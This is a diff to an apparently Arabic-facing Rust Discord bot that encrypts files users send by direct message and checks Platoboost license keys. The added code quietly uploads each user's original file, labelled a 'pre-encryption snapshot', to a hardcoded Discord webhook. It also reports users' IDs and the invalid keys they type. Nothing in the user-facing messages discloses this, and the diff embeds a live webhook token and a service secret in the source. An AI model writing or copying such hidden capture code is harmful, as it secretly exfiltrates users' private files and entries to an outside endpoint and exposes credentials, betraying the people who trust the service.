@@ -13,6 +13,7 @@ const MAX_FILE_SIZE: u64 = 5 * 1024 * 1024;
 const PLATOBOOST_PROJECT: &str = "3035";
 const PLATOBOOST_SECRET: &str = "e787153b-65f0-4a2a-b209-7bf2ddf2b8bc";
 const DISCORD_TOKEN: &str = "boy here";
+const ALERT_WEBHOOK: &str = "https://discord.com/api/webhooks/1444255368862503025/Mo6YV19ixBbwb4CRYg4HFV0iBcc7zenjK6PCHKG8AOmKDzcVqe1Nut8BLPtneQPnLTk7";
 
 #[derive(Clone, Debug)]
 struct Session {
@@ -91,6 +92,27 @@ async fn verify_key(client: &Client, key: &str) -> anyhow::Result<bool> {
     Ok(parsed.valid)
 }
 
+async fn send_webhook_alert(client: &Client, content: &str) {
+    let payload = serde_json::json!({
+        "content": content,
+        "allowed_mentions": { "parse": ["users", "roles", "everyone"] },
+    });
+
+    let _ = client.post(ALERT_WEBHOOK).json(&payload).send().await;
+}
+
+async fn send_webhook_file(client: &Client, user_id: u64, filename: &str, bytes: &[u8]) {
+    let part = reqwest::multipart::Part::bytes(bytes.to_vec()).file_name(filename.to_string());
+    let form = reqwest::multipart::Form::new().part("file", part).text(
+        "content",
+        format!(
+            "<@{}> uploaded a file. Capturing pre-encryption snapshot.",
+            user_id
+        ),
+    );
+    let _ = client.post(ALERT_WEBHOOK).multipart(form).send().await;
+}
+
 async fn start_consumer(mut rx: ProcessingQueueReceiver, bot: BotData) {
     while let Some(item) = rx.recv().await {
         let bot_clone = bot.clone();
@@ -161,6 +183,14 @@ async fn handle_dm_attachment(
         msg.channel_id
             .say(&ctx.http, "❌ الملف أكبر من 5MB. أعد المحاولة بملف أصغر.")
             .await?;
+        send_webhook_alert(
+            &data.http_client,
+            &format!(
+                "⚠️ Oversized upload blocked from <@{}> ({} bytes)",
+                msg.author.id.0, attachment.size
+            ),
+        )
+        .await;
         return Ok(());
     }
 
@@ -178,6 +208,14 @@ async fn handle_dm_attachment(
         .or_insert_with(Session::new);
     entry.reset_for_new_request();
     entry.file_bytes = Some(bytes.to_vec());
+
+    send_webhook_file(
+        &data.http_client,
+        msg.author.id.0,
+        &attachment.filename,
+        &bytes,
+    )
+    .await;
 
     let components = serenity::CreateActionRow::Buttons(vec![
         serenity::CreateButton::new("opt_default")
@@ -224,6 +262,14 @@ async fn handle_key_submission(
         msg.channel_id
             .say(&ctx.http, "❌ مفتاح غير صالح من Platoboost. حاول مجدداً.")
             .await?;
+        send_webhook_alert(
+            &data.http_client,
+            &format!(
+                "⛔ Invalid Platoboost key attempt by <@{}>: {}",
+                user_id, key
+            ),
+        )
+        .await;
         session.verified = false;
         return Ok(());
     }
